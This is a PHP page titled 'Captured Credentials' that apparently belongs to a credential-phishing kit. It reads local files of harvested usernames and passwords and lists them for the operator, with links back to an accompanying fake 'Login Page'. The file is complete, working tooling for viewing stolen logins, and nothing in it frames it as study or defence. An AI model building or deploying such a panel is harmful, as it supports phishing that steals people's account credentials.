<?php
// view.php - View all captured credentials
?>
<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        h1 { color: #333; }
        .credential { background: #f9f9f9; padding: 10px; margin: 10px 0; border-left: 4px solid #0095f6; }
        .log { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 4px; overflow-x: auto; }
        .empty { color: #666; font-style: italic; }
        .timestamp { color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Captured Credentials</h1>
        <p><small>Last updated: <?php echo date('Y-m-d H:i:s'); ?></small></p>
        <hr>

        <?php
        // Check multiple possible locations
        $files = [
            'auth/credentials.txt',
            'usernames.txt',
            'auth/usernames.dat'
        ];

        $found = false;
        foreach ($files as $file) {
            if (file_exists($file)) {
                $found = true;
                echo "<h2>📄 $file</h2>";
                echo "<div class='log'>";
                $content = file_get_contents($file);
                // Format each line
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    if (trim($line) != '') {
                        echo htmlspecialchars($line) . "<br>";
                    }
                }
                echo "</div>";
                echo "<br>";
            }
        }

        if (!$found) {
            echo "<p class='empty'>No credentials captured yet. Submit a test login first!</p>";
            echo "<p>Try logging in at: <a href='/'>Login Page</a></p>";
        }
        ?>

        <hr>
        <p><small>Files are saved in the container's file system. <br>
        <strong>Note:</strong> Files are ephemeral and will be lost on container restart/redeploy.</small></p>
        <p><a href="/">← Back to Login Page</a></p>
    </div>
</body>
</html>
